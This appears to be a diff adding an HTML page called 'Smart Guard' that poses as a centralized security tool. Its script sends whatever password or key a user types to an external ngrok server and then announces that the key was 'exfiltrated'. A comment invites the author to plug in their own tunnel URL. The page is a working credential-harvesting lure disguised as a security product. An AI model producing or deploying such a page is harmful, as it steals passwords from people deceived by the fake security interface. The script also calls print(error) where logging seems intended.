@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMART GUARD | Cyber-Sentinel Tool</title>
+    <style>
+        :root {
+            --primary-glow: #00f2fe;
+            --bg-color: #050a1a;
+            --panel-bg: rgba(16, 22, 47, 0.75);
+            --text-color: #e0e6ed;
+        }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+        }
+        .container {
+            background: var(--panel-bg);
+            backdrop-filter: blur(10px);
+            width: 380px; padding: 40px; border-radius: 15px;
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.7);
+            text-align: center;
+        }
+        h1 { font-size: 26px; color: var(--primary-glow); margin-bottom: 25px; letter-spacing: 2px; }
+        input {
+            width: 100%; padding: 15px; font-size: 16px; border-radius: 8px;
+            border: 2px solid rgba(0, 242, 254, 0.1); background: #050a1a;
+            color: white; outline: none; box-sizing: border-box; margin-bottom: 20px;
+        }
+        button {
+            width: 100%; padding: 15px; font-size: 14px;
+            background: linear-gradient(45deg, #4facfe, #00f2fe);
+            color: #050a1a; border: none; border-radius: 8px;
+            cursor: pointer; font-weight: bold; text-transform: uppercase;
+        }
+        #status { margin-top: 20px; font-weight: bold; color: #8c9baf; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>🔐 Smart Guard</h1>
+        <p style="color: #8c9baf; font-size: 14px; margin-top: -15px;">CENTRALIZED SECURITY PROTOCOL</p>
+        
+        <input type="text" id="userPassword" placeholder="Enter security key to logs...">
+        <button onclick="sendDataToServer()">Scan & Send</button>
+        
+        <div id="status">Terminal Connection: Idle</div>
+    </div>
+
+    <script>
+        // CRITICAL: Replace this URL with your Ngrok or Cloud Shell Live Server URL
+        const SERVER_URL = "https://manger-ozone-slingshot.ngrok-free.dev/receive-key "; 
+
+        async function sendDataToServer() {
+            const passwordInput = document.getElementById("userPassword").value;
+            const statusDiv = document.getElementById("status");
+
+            if (passwordInput.length === 0) {
+                statusDiv.innerText = "Error: Input cannot be empty";
+                statusDiv.style.color = "red";
+                return;
+            }
+
+            statusDiv.innerText = "Connecting to Server Terminal...";
+            statusDiv.style.color = "orange";
+
+            try {
+                // Sending data live to your python terminal using Fetch API
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password: passwordInput })
+                });
+
+                if (response.ok) {
+                    statusDiv.innerText = "Success: Key Exfiltrated to Terminal! 🟢";
+                    statusDiv.style.color = "#00ff88";
+                    document.getElementById("userPassword").value = ""; // Clear box
+                } else {
+                    statusDiv.innerText = "Server Error: Refused Transmission";
+                    statusDiv.style.color = "red";
+                }
+            } catch (error) {
+                statusDiv.innerText = "Transmission Failed: Server Offline 🔴";
+                statusDiv.style.color = "red";
+                print(error);
+            }
+        }
+
+        // Enter key support
+        document.getElementById("userPassword").addEventListener("keypress", function(event) {
+            if (event.key === "Enter") sendDataToServer();
+        });
+    </script>
+</body>
+</html>
